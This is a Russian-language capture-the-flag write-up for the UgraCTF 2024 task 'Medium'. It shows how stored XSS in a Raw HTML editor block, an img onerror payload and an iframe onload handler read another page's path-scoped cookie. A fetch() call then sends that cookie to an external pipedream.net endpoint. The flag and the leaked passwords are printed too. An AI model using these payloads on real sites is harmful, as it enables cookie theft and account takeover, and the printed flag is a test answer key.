# Medium: Write-up

Заходим на сайт и видим одну статью с разбором задания **Secure Vault**. Разбор выглядит как что-то, нагенерированное ChatGPT:

![Разбор](writeup/writeup-top.png)

В условии задания Medium сказано, что его флаг уже использовался ранее; по-видимому, нужно просто заслать флаг от Secure Vault.

К сожалению, сделать это сложно, потому что в какой-то момент разбор обрывается так:

![🔒 Продолжение статьи доступно только по платной подписке. Свяжитесь с автором для получения доступа.](writeup/locked.png)

Получается, нужно как-то обойти проверку на подписку.

Чтобы понять, как эта проверка реализована, создадим свою статью с платной подпиской.

![Статья](writeup/article-owner.png)

Снизу справа есть две кнопки, генерирующие:

- Публичную ссылку: https://medium.s.2024.ugractf.ru/jmasxqhy8z3072h1/mkk4e2kAK9NiguilVSG3gw/
- Приватную ссылку: https://medium.s.2024.ugractf.ru/jmasxqhy8z3072h1/mkk4e2kAK9NiguilVSG3gw/?password=olBIamGoMJoDTyQFkTSyHg

Публичная ссылка в точности совпадает с той, по которой мы создаем или редактируем статью. При этом сайт должен как-то понимать, кто его открывает, потому что при открытии этой ссылки в режиме инкогнито получаем следующее:

![Статья](writeup/article-public.png)

Поищем куки:

![Cookies](writeup/cookie.png)

Если создать еще одну статью, сервер создаст еще одну куку `password` с другим значением и другим параметром `path`. Получается, у каждой статьи есть свой пароль, позволяющий ее редактировать, и сервер сравнивает с ним переданную куку `password`. Поскольку у каждой куки `password` свой параметр `path`, при открытии статьи на сервер передается только пароль к этой статье.

Пароль в куках не совпадает с паролем в приватной ссылке. Действительно, если открыть приватную ссылку в режиме инкогнито, то произойдет установка куки и переадресация, и мы увидим следующую картину:

![Статья](writeup/article-private.png)

В условии сказано, что нас просят выложить анекдоты, а владелец сайта, по-видимому, их прочитает. Итак, наша задача — каким-то образом вытащить куку `password` от страницы с разбором, когда автор (или кто-то ещё, у кого есть приватная ссылка на статью с разбором) зайдёт почитать наши анекдоты.

В коде страницы видим:

```javascript
class PatchedRawTool extends RawTool {
	render() {
		const wrapper = super.render();
		if (this.readOnly) {
			const div = document.createElement("div");
			div.innerHTML = this.data.html;
			wrapper.appendChild(div);
			this.textarea.hidden = true;
		} else {
			this.textarea.addEventListener("keydown", e => {
				// Make backspace work correctly
				if (e.key === "Backspace") {
					e.stopPropagation();
				}
			})
		}
		return wrapper;
	}
}
```

Получается, для запуска JavaScript-кода на своей странице можно воспользоваться контейнером «Raw HTML» в редакторе. При открытии страницы без прав редактирования (то есть по публичной или приватной ссылке) HTML вставится через тег `innerHTML`.

Попробуем написать простейший эксплоит:

![Эксплоит](writeup/exploit1-owner.png)

Откроем в режиме инкогнито, и...

![Эксплоит](writeup/exploit1-public.png)

Ничего не произошло! При этом в DevTools видим, что тег `<script>` вставился:

![DevTools](writeup/exploit1-devtools.png)

Почему же код не исполнился? Ответ можно найти, например, [на StackOverflow](https://stackoverflow.com/questions/1197575/can-scripts-be-inserted-with-innerhtml). Содержимое тегов `<script>` не исполняется, если тег был вставлен через `innerHTML`. В ответах можно найти способ тем не менее добиться XSS через тег `<img>`:

```html
<img src="x" onerror="alert(1);">
```

Такой эксплоит уже срабатывает:

![Эксплоит](writeup/exploit2-owner.png)

![Эксплоит](writeup/exploit2-public.png)

Теперь нужно придумать, как вытащить куку с другим значением `path`. Ответ на этот вопрос тоже находится [на StackOverflow](https://stackoverflow.com/questions/945862/retrieve-a-cookie-from-a-different-path). Предлагается создать тег `<iframe>` с `src`, ссылающимся на другую страницу. Заодно можно и воспользоваться обработчиком `onload` у `<iframe>`.

```html
<iframe src="https://medium.s.2024.ugractf.ru/jmasxqhy8z3072h1/y4urwkEjcLxvz9WB/" onload="alert(this.contentDocument.cookie);">
```

При локальном запуске видим пустой `alert`, что, в общем-то, разумно. У автора при этом должны отобразиться куки.

Осталось понять, как передать эти куки себе. Для этого можно воспользоваться любым онлайн-сервисом, который позволяет принимать HTTP-запросы и логировать их. Например, [pipedream.com](https://pipedream.com/requestbin/):

![pipedream](writeup/pipedream1.png)

При открытии страницы по ссылке приходит событие:

![pipedream](writeup/pipedream2.png)

Настроим эксплоит так, чтобы он автоматически присылал на эту ссылку куки:

```html
<iframe src="https://medium.s.2024.ugractf.ru/jmasxqhy8z3072h1/y4urwkEjcLxvz9WB/" onload="fetch(`https://eohtssrnoxidmb8.m.pipedream.net/?${this.contentDocument.cookie}`);">
```

Осталось попробовать самим и подождать, пока на страницу зайдёт админ:

![pipedream](writeup/pipedream3.png)

Установим эту куку себе, самостоятельно сконструировав URL: https://medium.s.2024.ugractf.ru/jmasxqhy8z3072h1/y4urwkEjcLxvz9WB/?password=kLUMhULhczGL4hkx

Вот и флаг:

![Разбор](writeup/writeup-top.png)

Флаг: **ugra_secure_vault_unlocked_0mbs0t30i787**
